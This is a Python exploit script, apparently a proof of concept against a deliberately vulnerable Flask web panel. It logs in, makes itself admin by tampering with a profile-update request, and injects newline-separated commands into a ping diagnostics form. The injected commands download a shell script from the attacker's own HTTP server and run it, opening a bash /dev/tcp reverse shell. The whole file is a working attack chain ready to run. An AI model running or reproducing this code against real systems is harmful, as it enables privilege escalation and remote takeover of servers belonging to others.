import argparse
import requests
import re
import time
import http.server
import socketserver
import os
import threading

parser = argparse.ArgumentParser(description = "SecurePanel Authenticated Exploit")

parser.add_argument('-t', '--RHOSTS', type = str, required = True, help = "Target IP")
parser.add_argument('-P', '--RPORT', type = int, required = True, help = "Target Port")
parser.add_argument('-u', '--username', type = str, required = True, help = "Password")
parser.add_argument('-p', '--password', type = str, required = True, help = "Username")
parser.add_argument('-r', '--reverse_shell', action = "store_true", required = False, help = "Reverse Shell <optional>")
parser.add_argument('-a', '--VHOST', type = str, required = False, help = "Attacker IP for reverse shell")
parser.add_argument('-v', '--VPORT', type = int, required = False, help = "listener port for reverse shell")

args = parser.parse_args()

rhosts = args.RHOSTS
rport = args.RPORT
username = args.username
password = args.password
rev_shell = args.reverse_shell
vhost = args.VHOST
vport = args.VPORT

url = f"http://{rhosts}:{rport}"

class Colors:
    """
    ANSI escape codes for colored terminal output.
    Makes the exploit output easier to read.
    """
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def banner():
    """Print a cool banner because why not"""
    print(f"""{Colors.CYAN}
    ╔═══════════════════════════════════════════════════════════╗
    ║  {Colors.RED}FlaskVuln{Colors.CYAN} - Automated Exploit PoC                        ║
    ║  {Colors.YELLOW}Attack Chain: Login → BAC → Command Injection → Shell{Colors.CYAN}    ║
    ╚═══════════════════════════════════════════════════════════╝
    {Colors.END}""")

def success(msg):
    """Print success message in green"""
    print(f"{Colors.GREEN}[+] {msg}{Colors.END}")

def error(msg):
    """Print error message in red"""
    print(f"{Colors.RED}[-] {msg}{Colors.END}")

def info(msg):
    """Print info message in blue"""
    print(f"{Colors.BLUE}[*] {msg}{Colors.END}")

def warning(msg):
    """Print warning message in yellow"""
    print(f"{Colors.YELLOW}[!] {msg}{Colors.END}")


def extract_role(html):
    if 'ADMIN' in html.upper() and 'badge-admin' in html.lower():
          current_role = 'admin'
    else:
          current_role = 'user'

    user_id_match = re.search(r'user_id["\s:=]+(\d+)', html)
    if user_id_match:
          user_id = int(user_id_match.group(1))
    else:
          user_id = 0
        
    info(f"Current role: {current_role}, user_id: {user_id}")
    return[current_role, user_id]


def start_http_server(HTTP_SERVER_PORT):
    handler = http.server.SimpleHTTPRequestHandler
    handler.log_message = lambda self, format, *args: None

    try:
        with socketserver.TCPServer(("0.0.0.0", HTTP_SERVER_PORT), handler) as httpd:
            success(f"HTTP server started on port {HTTP_SERVER_PORT}")
            success(f"Serving shell.sh at http://0.0.0.0:{HTTP_SERVER_PORT}/shell.sh")
            httpd.handle_request()
    except OSError as e:
        error(f"Failed to start HTTP server: {e}")
        warning(f"Make sure port {HTTP_SERVER_PORT} is not in use")


def exploit(base_url, username, password, revShell=False, vhost=False, vport=False):
#--------------------Broken Access Control - Changing User Role to Admin--------------------
    session = requests.Session()

    info(f"Attempting to login as '{username}:{password}' ...")
    time.sleep(1)
    
    login_url = f"{base_url}/login"
    
    login_data = {
        'username': username,
        'password': password
    }

    user_id = None
    login = None

    try:
        response = session.post(login_url, login_data, allow_redirects=True)
        if 'Dashboard' in response.text and response.status_code == 200:
            success(f"Successfully logged in as '{username}'")
            time.sleep(0.5)
            login = True
            response_dashboard = session.get(f"{base_url}/dashboard")
            roles = extract_role(response_dashboard.text)
            user_id = roles[1] #save user id for later payload
        else:
            error("Login failed - Invalid Credentials or unexpected response")
            login = False

    except requests.exceptions.RequestException as e:
         error(f"Connection error: {e}")
         login = False

    time.sleep(0.5)

    if login:
        payload = {
            'user_id': user_id,
            'new_username': username,
            'role': 'admin',
            'current_password': '',
            'confirm_password': ''
        }
        #Send payload
        try:
            response_role_change = session.post(f"{base_url}/api/profile/update", payload)
            if response_role_change.status_code == 200:
                result = response_role_change.json()
                if result.get('success') and 'admin' in result.get('message', '').lower():
                    success("Privilege escalation successful! We are now admin.")
                    is_admin = True
                elif result.get('success') and 'no changes made' in result.get('message', '').lower():
                    info("Already an Admin!!")
                    is_admin = True
                else:
                    error("Could not escalate to Admin!")
                    is_admin = False
                    return
        except requests.exceptions.RequestException as e:
            error(f"Request failed: {e}")
            return
        
    time.sleep(1)
        
#--------------------Command Injection--------------------
    if revShell and is_admin:
        if vhost is None and vport is None:
            error('Missing arguments (listener IP and port)')
            return
        else: 
            info("Starting revershell...")
            time.sleep(0.7)
            warning(f"Make sure Listener is active on '{vhost}:{vport}'")
            time.sleep(0.7)
            warning(f"Make sure port 8081 is open for the payload transfer")
        
        time.sleep(0.7)
        info("--------------------")
        info("Command Injection:")
        info("--------------------")
        try:
            HTTP_SERVER_PORT = 8081
            diagnostics_url = f"{base_url}/admin/system/diagnostics"

            payload_content = f"bash -c 'bash -i >& /dev/tcp/{vhost}/{vport} 0>&1'\n"
            filename = 'shell.sh'

            with open(filename, "w") as f:
                f.write(payload_content)

            time.sleep(0.7)
            success(f"Created {filename} with payload:")
            info(f"    bash -c 'bash -i >& /dev/tcp/{vhost}/{vport} 0>&1'")

            http_thread = threading.Thread(target=start_http_server, args=(HTTP_SERVER_PORT,))
            http_thread.daemon = True  #Thread dies when main program exits
            http_thread.start() 

            time.sleep(1)           

            injection = f"127.0.0.1\ncurl -o /tmp/shell.sh http://{vhost}:{HTTP_SERVER_PORT}/shell.sh\nbash /tmp/shell.sh"

            data = {
                "tool": "ping",
                "target": injection
            }


            try:
                response = session.post(diagnostics_url, data=data, timeout=15)
                if response.status_code == 200:
                    success("Payload sent successfully!")
            except requests.exceptions.Timeout:
                #Timeout is expected - the reverse shell blocks the response
                success("Payload sent! (timeout expected due to reverse shell)")
            except requests.exceptions.ConnectionError:
                #Connection might reset when shell connects
                success("Payload sent! Check your listener.")

            http_thread.join(timeout=5)

            #Cleanup
            time.sleep(1)
            if os.path.exists(filename):
                os.remove(filename)
                info(f"Cleaned up {filename}")

            success("Exploit complete! Check your nc listener for shell.")

        except Exception as e:
            error(f"Exploit failed: {e}")
            #Cleanup on error
            if os.path.exists('shell.sh'):
                os.remove('shell.sh')

        warning(f"/tmp/{filename} from the victim host.")


if __name__ == "__main__":
    banner()
    exploit(url, username, password, rev_shell, vhost, vport)  